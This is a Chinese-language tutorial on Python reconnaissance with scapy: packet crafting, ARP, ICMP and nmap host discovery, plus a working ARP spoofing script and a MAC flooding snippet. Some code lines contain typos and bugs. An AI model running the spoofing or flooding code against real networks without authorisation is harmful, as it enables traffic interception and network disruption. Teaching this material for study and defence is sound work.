---
title: python信息收集脚本
---
[toc]
## 提要
`本文章需要一定的python基础，如：变量=字符串、列表、if选择、for循环、函数、异常处理、文件操作、模块导入、sys模块、os模块、多线程、optparse模块等`
- 本文章采用的kali系统，python2.7。

## 信息收集
- 被动信息收集
  > 主要通过各种公开的渠道获取目标系统的信息，比如利用站长工具、Google或者百度来获取目标网站的信息。
  > 特点是尽量不与目标系统产生直接交互，从而你避免留来痕迹。缺点是有可能会收集到一些过时信息，不够准确。
 
- 主动信息收集
  > 直接与目标系统进行交互通信，从而得到更为准确的即时信息。比如利用各种漏洞扫描软件对目标网站进行扫描。
  > 缺点是不可避免的会在目标系统中留下痕迹，可能会被封杀。

- 系统层面的主动信息收集
  > 主机发现、端口扫描、指纹识别。
  > 二层主机发现、三层主机发现、四层主机发现。
 
 - scapy
   > 可以构造各种类型的数据包，进行发送并接受回应。

- socket
  > 可以构造C/S模式的客户端和服务端。
  
- 相关脚本
  > ARP欺骗、MAC泛洪、交互式Shell

## 一、scapy模块的使用
### 1.1类和对象
- 在python中一切皆对象
  > 面向过程编程，根据业务逻辑从上到下来编写代码。
  > 面向对象编程，主要就是对类和对象的使用

- 什么是类和对象
  > 类是实例的工厂，类提供模板
  > 实例是具体的产品，对象是类的实例
```
1、定义名为Hero()的类，；类的名字一般是大写字母开头，
2、health、poewr两个变量，类中的变量也称为属性。
3、add函数（类中的函数通称为方法）
4、定义的类的时候类的后面要跟上(object),表明继承自object类。
5、类中的函数要有一个默认的self参数，且必须为第一个参数。

>>> class Hero(object):
...     health=100
...     poewr=70
...     def add(self,x,y):
...             return x+y
... 
>>> guanyu=Hero()
>>> guanyu.health
100
>>> guanyu.poewr
70
>>> guanyu.health=90
>>> guanyu.health
90
>>> guanyu.add(3,4)
7

```
- 通过内置函数dir()可以查看类或对象的属性和方法。
- 查看类的默认属性__dict__，可以查看属性以及属性的值
- 通过help()函数可以查看类或对象的帮助信息。
```
>>> dir(Hero)
['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'add', 'health', 'poewr']
>>>
>>>
>>> Hero.__dict__
dict_proxy({'__module__': '__main__', 'poewr': 70, 'add': <function add at 0x7f0b4cfd19d0>, 'health': 100, '__dict__': <attribute '__dict__' of 'Hero' objects>, '__weakref__': <attribute '__weakref__' of 'Hero' objects>, '__doc__': None})
>>>
>>>
>>> help(Hero)
>>> help(guanyu)
```

- 类是一种模板，模板中封装了多个函数供使用。
- 对象是根据模板创建的示例，可以调用被封装在类中的函数。
- 模块则集成了大量相关的类、函数、变量。

### 1.2、scapy的主要功能
- 可以根据自己的需要定义一系列的报文，并通过scapy发送出去，最后再接收回应。
- scapy的优势一方面是可以自由构造报文，另一方面是对接收到的回应只解码而不解释 ，它只会如实的显示响应报文的内容，而不提供结论，如何来判断和利用这些响应报文，完全有我们自己决定。
- scapy主要基于二、三、四层工作。
```
help(ARP)
dir(ARP)
lsc()    查scapy下的方法

ARP().display()
ARP().show()           查看ARP类设置的参数

pkt=ARP()
ptk.display()
kpt.show()             查看对象的参数
```
### 1.3、scapy基本用法
- scapy除了可以作为python库被调用之外，也可以作为单独的工具使用。
- ls()可以列出scapy支持的所有协议，每个协议都是一个类。
- lsc()可以列出scapy支持的所有方法。
- 用help()查看帮助信息。
- 用display()或show()方法查看属性信息。
- hwsrc  源MAC
- psrc    源IP
- hwdst 目的MAC
- pdst    目的IP
- op=1/2        1是请求包，2应答包
```
>>> pkt=ARP()
>>> pkt.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= who-has
  hwsrc= 00:0c:29:2d:64:63
  psrc= 192.168.31.46
  hwdst= 00:00:00:00:00:00
  pdst= 0.0.0.0

>>> pkt.pdst="192.168.31.152"
>>> pkt.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= who-has
  hwsrc= 00:0c:29:2d:64:63
  psrc= 192.168.31.46
  hwdst= 00:00:00:00:00:00
  pdst= 192.168.31.152

>>> sr1(pkt)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=14:85:7f:51:3b:4b psrc=192.168.31.152 hwdst=11:0d:24:2d:62:43 pdst=192.168.31.46 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>
>>> result=sr1(pkt)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> result.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= 6
  plen= 4
  op= is-at
  hwsrc= 14:85:7f:51:3b:4b
  psrc= 192.168.31.152
  hwdst= 11:0d:24:2d:62:43
  pdst= 192.168.31.46
###[ Padding ]### 
     load= '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

- 构造数据帧
```
>>> kpt=Ether()/ARP()
>>> kpt.show()
###[ Ethernet ]###              第二层
  dst= 50:64:5b:ec:98:57           目标MAC
  src= 60:0c:25:2d:34:64           源MAC
  type= ARP
###[ ARP ]###                 第三层
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has                 情求包
     hwsrc= 60:0c:25:2d:34:64
     psrc= 192.168.31.46
     hwdst= 00:00:00:00:00:00
     pdst= 0.0.0.0

```

- 发送
```
1、只发不收
		sendp() 第二层
		send()  第三层
2、即发又收
		srp()   第二层
		srp1()  第二层 发送接收第一个回复
		sr()   第三层
		sr1()   第三层 发送接收第一个回复
3、请求包	
		ans =sr1(ARP(pdst="192.168.1.1"),timeout=1,verbose=0)
		verbose=1  不显示详细信息
4、响应包
		sendp(Ether(dst="00:oc.29.21.21.78")/ARP(pdst="192.168.1.3",hwdst="00:oc.29.21.21.78",op=2)
		
```

### 1.4、arp欺骗脚本
`发送方不明确接收方的地址便通过ARP协议寻找目标MAC地址，如果依然没有结果，便只能把报文转发给路由器。`
- KeyboardInterrupt        异常为输入Ctrl+C。
```
#!/usr/bin/python3
#!coding:utf-8

import sys
import time
from scapy.all import *

def arpspoof(ip1,ip2):
    try:
        pkt=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip1,psrc=ip2)
        sendp(pkt)
        return
    except:
        return

def main():
    if len(sys.argv) != 3:
        print("使用方法： ./arp_spoof.py 目标主机IP，被欺骗主机ip")
        sys.exit()

    ip1=str(sys.argv[1]).strip()
    ip2=str(sys.argv[2]).strip()
    while True:
        try:
            arpspoof(ip1,ip2)
            time.sleep(0.5)
        except KeyboardInterrupt:
            print()
            break


if __name__=="__main__":
    main()
                                  
```

### 1.5、MAC泛洪
`PC1这时候想往PC2发送数据，数据帧经过交换机的时候，交换机会把数据帧中的源mac地址和进入的端口号记录到mac表中; 由于一开始mac表中没有PC2的mac地址和端口绑定，所以交换机会将这个数据帧进行全网转发，就是所谓的广播,也叫泛洪。`
```
pkt=Ether()/IP()/ICMP()

>>> IP().show()
###[ IP ]### 
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags= 
  frag= 0
  ttl= 64
  proto= hopopt
  chksum= None
  src= 127.0.0.1     源IP
  dst= 127.0.0.1     目标IP
  \options\



RandMAC()     随机产生一个MAC
RandIP()      随机产生一个IP


kpt=Ether(dst=RandMAC(),src=RandMAC())/IP(dst=RandIP(),src=RandIP())/ICMP()         
# ICMP用于IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息

sendp(kpt)
sendp(kpt,loop=1,count=1000,inter=0.1)
# loop=1        循环   
# count=1000     发送1000个包
# inter=0.1      间隔0.1秒
```

## 二、主机发现
`主机发现，即确定一个IP范围内存在的主机，从而找到潜在攻击目标。`
### 2.1、二层主机发现
- 二层发现主要利用的arp协议
  > 主要用于在内网的进行探测，发现与攻击者在同一个网段内的主机。

- 优先
  > 扫描速度快，可靠性高，缺点是不可路由。

### 2,2、subprocess模块
- subprocess模块接用来创建一个子进程，并运行一个外部的程序。
  > 通常用subprocess模块中check_output()方法来调用系统命令。

- subprocess.check_output()
  > 父进程等子进程完成，并返回子进程标准输出的输出结果。
  > a=subprocess.check_output("ls -l",shell=True)

- shell参数
  > 当shell=True时，如果要执行的程序是一个字符串，那么函数就会直接调用系统的shell来执行指定的程序。

```
#!/usr/bin/python
#!coding:utf-8


import sys
import time
import subprocess
from threading import Thread

def arping(ip):
    try:
        subprocess.check_output("arping -c 1 "+str(ip),shell=True)
        time.sleep(0.1)
        print ip,'在线'
        return
    except:
        return


def main():
    host=str(sys.argv[1]).strip()
    addr=host.split(".")[0]+"."+host.split(".")[1]+"."+host.split(".")[2]+"."
    for i in range(1,255):
        ip=addr+str(i)
        t=Thread(target=arping,args=(ip,))
        t.start()


if __name__=="__main__":
    main()

```
### 2.3、netdiscover
- netdiscover是一个专门用于二层主机发现的扫描工具，支持主动和被动两种扫描方式。
- 主动扫描，主动向外发送ARP广播。
  > netdiscover -r 192,168.31.0/24

- 被动扫描，不向外发送ARP广播，而是将网卡设置为混杂模式，接收网络中所有的ARP广播，从而起到隐蔽自身的作用。
  > netdiscover -p

### 2.4、nmap
- nmap是一款开源的网络发现和安全审计工具，包含主机发现、端口扫描、版本侦测、操作系统侦测四项基本功能。
- nmap实现主机发现的关键，是nmap静心构造并发送到主机的探测包。
```
 1、-sn：执行ping扫描，但不扫描端口。
			自适应。在同一网段用arp扫描，在不同网段用ping
			nmap -sn 192.168.31.0/24
		
2、nmap除了发送ARP请求之外，还进行DNS解析，可以加上-n选项，使之不做DNS解析，
			nmap -sn -n 192.168.31.60
			
3、nmap支持批量扫描
			nmap 192.168.31.60 192.168.31.61
			nmap 192.168.31.10-100
			nmap 192.168.31.0/24

4、-iL选项可以从事先准备好的文本中读取要扫描的地址列表。
			nmap -iL ip.txt
```

### 2.5、利用scapy实现ARP扫描
```
#!/usr/bin/python3
#!coding:utf-8

import os
import time
from scapy.all import *
from threading import Thread
from optparse import OptionParser

# 利用的是发送目标不明确时，就会在在路由里面广播
def laowine_sweep_arp(ip):
    try:
        pkt_ether_arp=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
# 构造二层三层数据包
        result=srp1(pkt_ether_arp,timeout=1,verbose=0)
# timeout响应超时 verbose=1/0（0是不显示详细信息）
        if result:
            time.sleep(0.1)
            print (ip,'在线')
            return
    except:
        return


# 设置-f和-i选项

def main():
    usage="Usage:%prog -f <filename> -i (ip address)"
# %prog当前文件的名字
    parser=OptionParser(usage=usage)
    parser.add_option("-f","--file",type="string",dest="filename",help="specify the IP address file")
    parser.add_option("-i","--ip",type="string",dest="address",help="specity the IP address")
    options,args=parser.parse_args()
    filename=options.filename
    address=options.address


    if (filename==None and address==None):
        print ("请指定IP列表文件或者IP地址")
        sys.exit()

    if filename:
        if not os.path.exists(filename):
            print ("指定的文件不存在，请重新输入。")
            sys.exit()
        laowine_file=open(filename,"r")
        for i in laowine.file():
            ip=i.strip("\n")
            t=Thread(target=laowine_sweep_arp,args=(ip,))
            t.start()


    if address:
        laowine_prefix=address.split(".")[0]+"."+address.split(".")[1]+"."+address.split(".")[2]+"."
        for i in range(1,255,1):
            ip=laowine_prefix+str(i)
# 多线程运行，target执行的函数名，args传递的参数用元组，注意一个参数的传递需要逗号
            t=Thread(target=laowine_sweep_arp,args=(ip,))
# 执行
            t.start()


if __name__=="__main__":
    main()

```
### 2.6、三层主机发现
- 原理
  > 主要利用icmp协议

- 优先
  > 可路由，可以跨网段扫描

- 缺点
  > 有可能被防火墙过滤，扫描结果不准确。

- ICMP协议（ping命令）介绍
  > ICMP,Internet控制协议，用于在网络中传递控制。
  > Ping命令利用了ICMP两种类型的控制消息:echo request（请求报文）、echo reply（回应报文）。

- TTL值
  > TTL即数据包的生存周期，每个系统对其所发送的数据包都要赋一个TTL的初始值。默认情况下，windows系统为128，linux系统为64。
  > 每经过一次路由，TTL值减1。
  > tracert命令向指定的目标主机发送多次回显请求消息，并把封装该消息的数据包的TTL值从1开始递增。

- ping命令防火墙设置
  > iptables -A INPUT -p icmp -j DROP/ACCEPT
  > iptables -R INPUT 1 -p icmp -j ACCEPT
  > iptables -l         列表
  > iptables -f         清空

- fping
  > fping -g 192.168.31.0/24 2> /dev/null | grep alive 

- python脚本
```
>>> pkt=IP()/ICMP()
>>> pkt.show()
###[ IP ]### 
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags= 
  frag= 0
  ttl= 64
  proto= icmp
  chksum= None
  src= 127.0.0.1
  dst= 127.0.0.1
  \options\
###[ ICMP ]### 
     type= echo-request
     code= 0
     chksum= None
     id= 0x0
     seq= 0x0
>>> pkt[IP].dst= "192.168.31.152"
>>> pkt.show()
###[ IP ]### 
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags= 
  frag= 0
  ttl= 64
  proto= icmp
  chksum= None
  src= 192.168.31.46
  dst= 192.168.31.152
  \options\
###[ ICMP ]### 
     type= echo-request
     code= 0
     chksum= None
     id= 0x0
     seq= 0x0

>>> result= sr1(pkt)
Begin emission:
Finished sending 1 packets.
..*
Received 3 packets, got 1 answers, remaining 0 packets
>>> result.show()
###[ IP ]### 
  version= 4
  ihl= 5
  tos= 0x0
  len= 28
  id= 16599
  flags= 
  frag= 0
  ttl= 128
  proto= icmp
  chksum= 0x39f3
  src= 192.168.31.152
  dst= 192.168.31.46
  \options\
###[ ICMP ]### 
     type= echo-reply
     code= 0
     chksum= 0xffff
     id= 0x0
     seq= 0x0
###[ Padding ]### 
        load= '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
由上面可以知道，只要返回的result有值，代表的就是有回应的包就是通的。
python代码的核心就是：
		filename=str(sys.argv[1])
		file=(filename,"r")
		for addr in file:
				ans=sr1(IP(dst=addr.strip())/ICMP(),timeout=1,verbose=0)
				if ans:
							print (addr.strip())
```
